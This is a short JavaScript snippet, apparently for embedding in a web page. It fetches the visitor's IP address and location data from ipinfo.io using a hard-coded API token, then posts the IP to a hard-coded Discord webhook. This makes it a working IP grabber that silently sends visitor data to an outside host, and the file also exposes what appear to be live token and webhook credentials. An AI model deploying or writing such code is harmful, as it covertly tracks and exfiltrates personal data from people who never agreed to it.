const tk = "c294a87bad35cd";
const wb = "https://discord.com/api/webhooks/1129036584747020371/B4bCD5sSp2g6Y8U0acPd8mcK30MnvF5m9jJKcyo7FlqU5yKm5iW9Z2IafcEWGoqMm8Fm";
const datos = [];
 fetch("https://ipinfo.io/?token="+tk)  
 .then(res => res.json())
 .then (res => {
    ip = res.ip;
    datos.push(res);
 const params = {
     username: "test",
     avatar_url: "",
     content: datos[0].ip
};
    fetch(wb, {
        method: 'POST',
        headers: {
            'Content-Type':'application/json'
        },
        body: JSON.stringify(params)
    })
});




